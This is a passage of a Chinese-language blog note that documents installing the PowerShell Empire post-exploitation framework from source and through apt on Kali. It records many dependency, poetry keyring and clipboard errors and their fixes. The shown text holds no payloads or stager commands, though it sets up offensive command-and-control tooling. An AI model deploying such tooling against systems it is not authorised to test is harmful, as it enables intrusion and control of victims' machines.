xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon" name="print"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button><div class="arrow end"></div></div><div class="vp-toc-wrapper"><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#安装">安装</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#单独配置-poetry-虚拟环境">单独配置 Poetry 虚拟环境</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#github">Github</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#kali">Kali</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#demo">Demo</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#starkiller">Starkiller</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#整体源码概述">整体源码概述</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#调试">调试</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#主程序入口">主程序入口</a></li><!----><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#listener">Listener</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level2" href="#报错处理">报错处理</a></li><li><ul class="vp-toc-list"><!--[--><li class="vp-toc-item"><a class="route-link vp-toc-link level3" href="#pydantic-importerror-cannot-import-name-field-validator-from-pydantic">pydantic-ImportError: cannot import name &#39;field_validator&#39; from &#39;pydantic&#39;</a></li><!----><!--]--></ul></li><!--]--></ul><div class="vp-toc-marker" style="top:-1.7rem;"></div></div><!----></aside></div><!----><div class="theme-hope-content" vp-content><h1 id="powershell-empire" tabindex="-1"><a class="header-anchor" href="#powershell-empire"><span>Powershell Empire</span></a></h1><blockquote><p><a href="https://github.com/EmpireProject/Empire.git" target="_blank" rel="noopener noreferrer">https://github.com/EmpireProject/Empire</a></p><p><a href="https://www.kali.org/tools/powershell-empire/" target="_blank" rel="noopener noreferrer">powershell-empire | Kali Linux Tools --- powershell 帝国| Kali Linux 工具</a></p><p><a href="https://www.freebuf.com/sectool/158393.html" target="_blank" rel="noopener noreferrer">PowerShell Empire 实战入门篇 - FreeBuf 网络安全行业门户</a></p><p><a href="https://www.freebuf.com/articles/web/165925.html" target="_blank" rel="noopener noreferrer">Empire 2.5：PowerShell 渗透测试实战指南(上篇) - FreeBuf 网络安全行业门户</a></p></blockquote><p><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener noreferrer">EmpireProject/Empire: Empire is a PowerShell and Python post-exploitation agent. (github.com)</a> 是一个渗透测试框架(<code>post-exploitation framework</code>), 它包含一个 Pure Powershell 2.0 的 Windows 代理和一个 Pure Python</p><hr><ul><li><a href="#powershell-empire">Powershell Empire</a><ul><li><a href="#%E5%AE%89%E8%A3%85">安装</a><ul><li><a href="#%E5%8D%95%E7%8B%AC%E9%85%8D%E7%BD%AE-poetry-%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83">单独配置 Poetry 虚拟环境</a></li><li><a href="#github">Github</a><ul><li><a href="#1clone-%E4%BB%93%E5%BA%93%E6%9C%AC%E4%BD%93%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%9D%E8%B5%96%E4%BB%93%E5%BA%93">1.clone 仓库本体及相关依赖仓库</a></li><li><a href="#2-%E5%88%87%E5%88%B0%E7%A8%B3%E5%AE%9A%E7%89%88%E6%9C%AC%E5%B9%B6%E5%AE%89%E8%A3%85">2. 切到稳定版本并安装</a></li><li><a href="#%E4%B8%8A%E7%BA%BF%E4%B8%AA%E6%9C%BA%E5%AD%90%E9%AA%8C%E4%B8%80%E4%B8%8B%E8%83%BD%E4%B8%8D%E8%83%BD%E7%94%A8">上线个机子验一下能不能用</a></li></ul></li><li><a href="#kali">Kali</a></li><li><a href="#demo">Demo</a><ul><li><a href="#%E6%8B%93%E6%89%91">拓扑</a></li><li><a href="#%E8%B5%B7-server">起 server</a></li><li><a href="#%E8%B5%B7-client">起 Client</a></li><li><a href="#%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA-http-listener">新建一个 http listener</a></li><li><a href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%BB%A5%E4%B8%8A%E7%BA%BF%E4%B8%BB%E6%9C%BA">执行命令以上线主机</a></li></ul></li></ul></li><li><a href="#starkiller">Starkiller</a></li><li><a href="#%E6%95%B4%E4%BD%93%E6%BA%90%E7%A0%81%E6%A6%82%E8%BF%B0">整体源码概述</a><ul><li><a href="#%E8%B0%83%E8%AF%95">调试</a></li><li><a href="#%E4%B8%BB%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3">主程序入口</a></li><li><a href="#listener">Listener</a><ul><li><a href="#listener-start">Listener Start</a></li><li><a href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5">建立连接</a></li></ul></li></ul></li><li><a href="#%E6%8A%A5%E9%94%99%E5%A4%84%E7%90%86">报错处理</a><ul><li><a href="#pydantic-importerror-cannot-import-name-field_validator-from-pydantic">pydantic-ImportError: cannot import name &#39;field_validator&#39; from &#39;pydantic&#39;</a></li></ul></li></ul></li></ul><hr><h2 id="安装" tabindex="-1"><a class="header-anchor" href="#安装"><span>安装</span></a></h2><h3 id="单独配置-poetry-虚拟环境" tabindex="-1"><a class="header-anchor" href="#单独配置-poetry-虚拟环境"><span>单独配置 Poetry 虚拟环境</span></a></h3><p>先到 <a href="https://github.com/BC-SECURITY/Empire/blob/main/pyproject.toml" target="_blank" rel="noopener noreferrer">Empire/pyproject.toml at main · BC-SECURITY/Empire</a> 拷贝一份 <code>pyproject.toml</code> 然后在 python3.10 以上的环境中 <code>poetry install -vvv</code></p><p>需要手动 <code>poetry add</code> 的库还有</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>netifaces</span></span>
<span class="line"><span>pycryptodomex</span></span>
<span class="line"><span>PyJWT</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>依赖准备好后执行 <code>poetry shell</code> 激活虚拟环境命令行然后运行</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">powershell-empire</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> server</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p>如果还有没装的库根据报错再查漏补缺即可</p></blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202411131104737.png" alt="image-20241113110423316"></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">powershell-empire</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> client</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202411131108981.png" alt="image-20241113110606647"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202411131108005.png" alt="image-20241113110830722"></p><hr><h3 id="github" tabindex="-1"><a class="header-anchor" href="#github"><span>Github</span></a></h3><blockquote><p>PS: <code>main</code> 分支反映了最新更改，可能并不总是稳定的。克隆存储库后，可以通过运行 <code>setup/checkout-latest-tag.sh</code> 脚本签出最新的稳定版本。</p></blockquote><hr><h4 id="_1-clone-仓库本体及相关依赖仓库" tabindex="-1"><a class="header-anchor" href="#_1-clone-仓库本体及相关依赖仓库"><span>1.clone 仓库本体及相关依赖仓库</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> clone</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --recursive</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> https://github.com/BC-SECURITY/Empire.git</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041658684.png" alt="image-20230904165844577"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041703364.png" alt="image-20230904170344264"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041713348.png" alt="image-20230904171347281"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041718686.png" alt="image-20230904171831597"></p><p>上面的全是首次 clone 失败的 reference repo, 失败后会加入计划任务, 全 clone 一遍后会重新 clone 失败的仓库</p><p>如下即为重新 clone 成功了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041720336.png" alt="image-20230904172035940"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041721397.png" alt="image-20230904172111320"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041721828.png" alt="image-20230904172129685"></p><hr><h4 id="_2-切到稳定版本并安装" tabindex="-1"><a class="header-anchor" href="#_2-切到稳定版本并安装"><span>2. 切到稳定版本并安装</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Empire</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">./setup/checkout-latest-tag.sh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041747913.png" alt="image-20230904174753857"></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ./setup/install.sh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041748553.png" alt="image-20230904174856396"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041749800.png" alt="image-20230904174921667"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041749975.png" alt="image-20230904174950726"></p><p>中间会有个提示要不要装 <code>xar</code> 和 <code>bomutils</code> 的选项需要手动输入选择一下:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041750990.png" alt="image-20230904175022743"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041750178.png" alt="image-20230904175051016"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041751997.png" alt="image-20230904175115885"></p><p>解压了一堆包:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041753187.png" alt="image-20230904175330094"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041753859.png" alt="image-20230904175353728"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041754051.png" alt="image-20230904175428980"></p><p>然后开始</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041754737.png" alt="image-20230904175450645"></p><blockquote><p>这里由于网络原因超时了 ↑, 然后后面恢复了:</p></blockquote><p>然后应该是吧 xar 的目录列出来了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041756771.png" alt="image-20230904175613675"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041757186.png" alt="image-20230904175701068"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041757592.png" alt="image-20230904175720460"></p><p>然后提示了一堆需要 autoupdate:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041758733.png" alt="image-20230904175847634"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041759929.png" alt="image-20230904175914796"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041759009.png" alt="image-20230904175930869"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041759237.png" alt="image-20230904175952167"></p><hr><p>然后似乎是在拿 gcc 编译 libxml, 报了一堆 warning, 应该不用管</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041801620.png" alt="image-20230904180129483"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041802983.png" alt="image-20230904180201860"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041802398.png" alt="image-20230904180223245"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041803795.png" alt="image-20230904180306732"></p><hr><p>编译 <code>xar</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041803728.png" alt="image-20230904180354623"></p><hr><p>拉 <code>bomutils</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041804954.png" alt="image-20230904180442879"></p><hr><p>然后会询问要不要装 <code>openjdk</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041805669.png" alt="image-20230904180525602"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041806260.png" alt="image-20230904180647064"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041807467.png" alt="image-20230904180727351"></p><hr><p>装 C# agents 以及 modules</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041808478.png" alt="image-20230904180826346"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041808843.png" alt="image-20230904180844742"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041808376.png" alt="image-20230904180856309"></p><hr><p>询问要不要装 <code>MinGW</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041813243.png" alt="image-20230904181339135"></p><p>得, 又是网络问题, 打个快照先, 然后重跑一遍安装脚本:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041821847.png" alt="image-20230904182144749"></p><p>又是 xar</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041822292.png" alt="image-20230904182221225"></p><p>下面一堆目录和 warning 就不截图了, 然后接着是 OpenJDK:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041823723.png" alt="image-20230904182326472"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041824057.png" alt="image-20230904182424979"></p><p>然后是 <code>MinGW</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041849047.png" alt="image-20230904184908942"></p><p>最后又 package not found, enmmmmmm, 再重装一次吧:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309041856976.png" alt="image-20230904185602899"></p><blockquote><p>得, 总是网络问题, 挂个代理再试一次吧...</p></blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051044209.png" alt="image-20230905104400091"></p><p>看样子是成功了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051054607.png" alt="image-20230905105430483"></p><hr><p>然后是检查 python 版本:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051055020.png" alt="image-20230905105540909"></p><hr><p>然后是装一些包, 不过似乎全失败了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051056310.png" alt="image-20230905105623145"></p><p>也许和代理有关系, 把代理下掉试试:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051056330.png" alt="image-20230905105656210"></p><p>依旧不行:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051057057.png" alt="image-20230905105742903"></p><p>记录一下失败的日志:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051104393.png" alt="image-20230905110450222"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051107539.png" alt="image-20230905110742437"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051108491.png" alt="image-20230905110826373"></p><p>可以看到安装失败的包有:</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>pycparser</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p><a href="https://github.com/eliben/pycparser" target="_blank" rel="noopener noreferrer">eliben/pycparser: 🐍 Complete C99 parser in pure Python --- eliben/pycparser: 🐍 纯 Python 中的完整 C99 解析器 (github.com)</a></p></blockquote><p>手动装一下试试:</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">pip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> pycparser</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051115309.png" alt="image-20230905111518207"></p><p>手动装显示装好了, 不过重新运行脚本依旧会出错:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051135044.png" alt="image-20230905113545960"></p><p>按照 <code>DUBusErrorResponse</code> 作为关键词进行检索, 似乎是 <code>poetry</code> 的问题</p><blockquote><p>[<a href="https://github.com/HibiKier/zhenxun_bot/issues/1217" target="_blank" rel="noopener noreferrer">已解决] poetry install 命令安装依赖报错，无法安装部分依赖 · Issue #1217 · HibiKier/zhenxun_bot (github.com)</a></p><p><a href="https://stackoverflow.com/questions/75080993/dbuserrorresponse-while-running-poetry-install" target="_blank" rel="noopener noreferrer">python - DBusErrorResponse while running poetry install - Stack Overflow --- python - 运行诗歌安装时的 DBusErrorResponse - VoidCC</a></p></blockquote><p>尝试直接 poetry add 看看:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051339232.png" alt="image-20230905133944148"></p><p>检索该报错找到了如下信息:</p><blockquote><p><a href="https://github.com/python-poetry/poetry/issues/3012" target="_blank" rel="noopener noreferrer">KeyRingError: Failed to create the collection: Prompt dismissed.. · Issue #3012 · python-poetry/poetry --- KeyRingError：无法创建集合：提示已关闭..·问题#3012·python-poetry/poetry (github.com)</a></p><p><a href="https://github.com/python-poetry/poetry/issues/2692" target="_blank" rel="noopener noreferrer">Error: Unable to store the password for poetry-repository-pypi in the key ring: Failed to unlock the collection! · Issue #2692 · python-poetry/poetry --- 错误：无法在钥匙圈中存储诗歌存储库-pypi 的密码：无法解锁集合！ · 问题 #2692 · python-poetry/poetry (github.com)</a></p><p><a href="https://blog.frank-mich.com/python-poetry-1-0-0-private-repo-issue-fix/" target="_blank" rel="noopener noreferrer">python poetry 1.0.0 private repo issue fix – Frank-Mich&#39;s Blog --- python 诗 1.0.0 私人回购问题修复 – Frank-Mich 的博客</a></p></blockquote><p>两个报错最终都指向了 kering, 且都提到了同一种解决方案:</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> PYTHON_KEYRING_BACKEND</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">keyring</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">backends</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Keyring</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051348555.png" alt="image-20230905134854510"></p><p>再重新跑一遍安装脚本试试:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051349340.png" alt="image-20230905134918277"></p><p>终于开始正常运行了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051351591.png" alt="image-20230905135131176"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051352600.png" alt="image-20230905135218509"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051352295.png" alt="image-20230905135243218"></p><p>终于成功装完了, 根据最后的提示重新加载下配置文件来启用 <code>nim</code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">source</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ~/.bashrc</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051355203.png" alt="image-20230905135507151"></p><blockquote><p>这里又反复确认了下项目所在的 kali 用户目录以及 root 用户的 <code>.bashrc</code> 中的配置是否都能成功加载完成, 因为我不能确定到底是把配置写在那个用户下了, 个人认为应该是当前命令行的 root 用户, 翻了下两个文件, 确实是在 root 下面:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051357723.png" alt="image-20230905135726625"></p></blockquote><blockquote><p><a href="https://zh.wikipedia.org/wiki/Nim" target="_blank" rel="noopener noreferrer">Nim - 维基百科，自由的百科全书 (wikipedia.org)</a></p><p><strong>Nim</strong>是一个<a href="https://zh.wikipedia.org/wiki/%E6%8C%87%E4%BB%A4%E5%BC%8F%E7%B7%A8%E7%A8%8B" target="_blank" rel="noopener noreferrer">指令式</a>、<a href="https://zh.wikipedia.org/wiki/%E9%80%9A%E7%94%A8%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener noreferrer">通用</a>、<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E9%87%8D%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8F" target="_blank" rel="noopener noreferrer">多范式</a>、<a href="https://zh.wikipedia.org/wiki/%E9%9D%99%E6%80%81%E7%B1%BB%E5%9E%8B" target="_blank" rel="noopener noreferrer">静态类型</a>、<a href="https://zh.wikipedia.org/wiki/%E7%B7%A8%E8%AD%AF%E8%AA%9E%E8%A8%80" target="_blank" rel="noopener noreferrer">编译型</a>的<a href="https://zh.wikipedia.org/wiki/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener noreferrer">编程语言</a>, 设计目标是像<a href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80" target="_blank" rel="noopener noreferrer">C</a>一样快速，像<a href="https://zh.wikipedia.org/wiki/Python" target="_blank" rel="noopener noreferrer">Python</a>一样有表达力，并像<a href="https://zh.wikipedia.org/wiki/Lisp" target="_blank" rel="noopener noreferrer">Lisp</a>一样有扩展性。</p></blockquote><hr><p>接下来起一下 server client 试试</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051409613.png" alt="image-20230905140935515"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051409165.png" alt="image-20230905140954014"></p><p>又有报错, 不管是包还是网络, 先解决第一个问题:</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>[ERROR]: advanced_reporting failed to initialize: No module named &#39;stix2&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>看了下这是 python 的一个包, 尝试拿 poetry 装一下这个库:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051427204.png" alt="image-20230905142742025"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051428927.png" alt="image-20230905142804783"></p><p>看样子还是能成功装上的, 再起一遍 server 试试</p><blockquote><p>由于前面还看到下载失败啥的, 所以还是先挂下代理(</p></blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051430365.png" alt="image-20230905143045296"></p><p>看样子似乎是正常启动了</p><hr><p>再起一下 client:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051431331.png" alt="image-20230905143144250"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051431951.png" alt="image-20230905143159838"></p><hr><p>总算是成功通过源码装好了, 嫌费劲的话还是直接 apt 装就行了:</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> apt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> powershell-empire</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><hr><h4 id="上线个机子验一下能不能用" tabindex="-1"><a class="header-anchor" href="#上线个机子验一下能不能用"><span>上线个机子验一下能不能用</span></a></h4><p>具体步骤可以参阅下面的 <a href="#Demo">Demo 章节</a></p><p>在生成上线命令时报错了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051548904.png" alt="image-20230905154807411"></p><p>不过看上去只是拷贝没成功而已, 通过报错提示指向的网页: <a href="https://pyperclip.readthedocs.io/en/latest/index.html#not-implemented-error" target="_blank" rel="noopener noreferrer">Welcome to Pyperclip’s documentation! — Pyperclip 1.5 documentation --- 欢迎来到 Pyperclip 的文档！ — Pyperclip 1.5 文档</a> 找到了解决方案:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051552656.png" alt="image-20230905155244575"></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> xsel</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # to install the xsel 